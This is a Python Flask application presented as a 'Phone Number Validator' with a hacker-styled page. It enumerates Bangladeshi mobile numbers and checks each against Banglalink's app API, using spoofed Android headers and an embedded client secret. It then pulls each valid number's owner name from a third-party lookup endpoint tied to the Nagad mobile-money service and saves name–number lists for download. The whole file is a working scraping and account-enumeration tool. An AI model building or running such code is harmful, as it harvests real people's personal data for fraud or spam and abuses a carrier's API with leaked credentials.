import os
import threading
import random
import requests
import time
from flask import Flask, send_file, jsonify, render_template_string

app = Flask(__name__)

# Global variables
running = False
valid_numbers_count = 0

# Directory to store files
storage_dir = "storage"
os.makedirs(storage_dir, exist_ok=True)

@app.route('/')
def home():
    # HTML content with a hacker theme and download buttons
    html_content = """
    <html>
        <head>
            <title>Phone Number Validator</title>
            <style>
                body {
                    background-color: #0f0f0f;
                    color: #00ff00;
                    font-family: "Courier New", Courier, monospace;
                }
                button {
                    display: inline-block;
                    padding: 10px 20px;
                    font-size: 16px;
                    cursor: pointer;
                    background-color: #333;
                    color: #00ff00;
                    border: 1px solid #00ff00;
                    border-radius: 5px;
                    margin: 5px;
                }
                button:hover {
                    background-color: #555;
                }
                #progress {
                    margin-top: 20px;
                }
            </style>
            <script>
                function updateProgress() {
                    fetch('/progress')
                        .then(response => response.json())
                        .then(data => {
                            document.getElementById('progress').innerText = "Valid Numbers Found: " + data.valid_numbers_count;
                        });
                }
                setInterval(updateProgress, 5000); // Update every 5 seconds
            </script>
        </head>
        <body>
            <h1>Welcome to the Phone Number Validator!</h1>
            <form action="/download/valid_numbers" method="get">
                <button type="submit">Download Valid Numbers</button>
            </form>
            <form action="/download/names_with_numbers" method="get">
                <button type="submit">Download Names with Numbers</button>
            </form>
            <div id="progress">Valid Numbers Found: 0</div>
        </body>
    </html>
    """
    return render_template_string(html_content)

@app.route('/start')
def start_validation():
    global running
    if not running:
        running = True
        threading.Thread(target=find_valid_phone_numbers, daemon=True).start()
        return "Phone number validation started."
    return "Validation already running."

@app.route('/stop')
def stop_validation():
    global running
    running = False
    return "Phone number validation stopped."

@app.route('/progress')
def progress():
    global valid_numbers_count
    return jsonify(valid_numbers_count=valid_numbers_count)

@app.route('/download/valid_numbers')
def download_valid_numbers():
    path = os.path.join(storage_dir, "valid_numbers.txt")
    if os.path.exists(path):
        return send_file(path, as_attachment=True)
    return "File not found.", 404

@app.route('/download/names_with_numbers')
def download_names_with_numbers():
    path = os.path.join(storage_dir, "names_with_numbers.txt")
    if os.path.exists(path):
        return send_file(path, as_attachment=True)
    return "File not found.", 404

def find_valid_phone_numbers():
    global running, valid_numbers_count
    valid_numbers = set()
    names_with_numbers = []
    tried_numbers = set()
    
    number_templates = [
        "01985399",  # Template 1
        "01983825",  # Template 2
        "01985664",  # Template 3
        "01998872",  # Template 4
    ]

    while running:
        for template in number_templates:
            if not running:
                break
            phone_number = generate_phone_number(template, tried_numbers)
            if validate_phone_number(phone_number):
                valid_numbers.add(phone_number)
                valid_numbers_count = len(valid_numbers)
                details = fetch_user_details(phone_number)
                if details and 'name' in details:
                    names_with_numbers.append({'number': phone_number, 'name': details['name']})
                # Write to files
                write_valid_numbers_to_file(valid_numbers)
                write_names_and_numbers_to_file(names_with_numbers)
            time.sleep(1)  # Sleep to control the request rate

def generate_phone_number(template, tried_numbers):
    """Generates a phone number using the provided template with the last three digits randomized."""
    while True:
        phone_number = template + ''.join(random.choices("0123456789", k=3))
        if phone_number not in tried_numbers:
            tried_numbers.add(phone_number)
            return phone_number

def validate_phone_number(phone_number):
    """Validates the phone number by sending a POST request to an API."""
    url = "https://myblapi.banglalink.net/api/v1/validate-number"
    headers = {
        "Cache-Control": "no-cache",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "17",
        "Host": "myblapi.banglalink.net",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/4.9.3",
        "Cache-Control": "public, max-age=900, max-stale=900",
        "platform": "android",
        "app-version": "10.10.0",
        "version-code": "1010000",
        "api-client-pass": "1E6F751EBCD16B4B719E76A34FBA9",
        "msisdn": "",
        "connection-type": "",
    }
    data = {"phone": phone_number}
    try:
        response = requests.post(url, headers=headers, data=data)
        if response.status_code == 200:
            return True
    except requests.RequestException as e:
        print(f"Request failed: {e}")
    return False

def fetch_user_details(valid_number):
    """Fetches user details for a valid phone number."""
    api_url = f"https://api.pikaapis.my.id/nagad.php?msisdn={valid_number}"
    try:
        response = requests.get(api_url)
        if response.status_code == 200:
            return response.json()
    except requests.RequestException as e:
        print(f"Request failed: {e}")
    return None

def write_valid_numbers_to_file(valid_numbers):
    """Writes all valid numbers to a text file."""
    file_path = os.path.join(storage_dir, "valid_numbers.txt")
    with open(file_path, "w") as file:
        for number in valid_numbers:
            file.write(f"{number}\n")

def write_names_and_numbers_to_file(details_list):
    """Writes valid numbers with their names to a text file."""
    file_path = os.path.join(storage_dir, "names_with_numbers.txt")
    with open(file_path, "w") as file:
        for index, details in enumerate(details_list, start=1):
            file.write(f"{index}. number - {details['number']}\n")
            file.write(f"   name - {details['name']}\n\n")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))  # Use the PORT environment variable
    app.run(host='0.0.0.0', port=port)
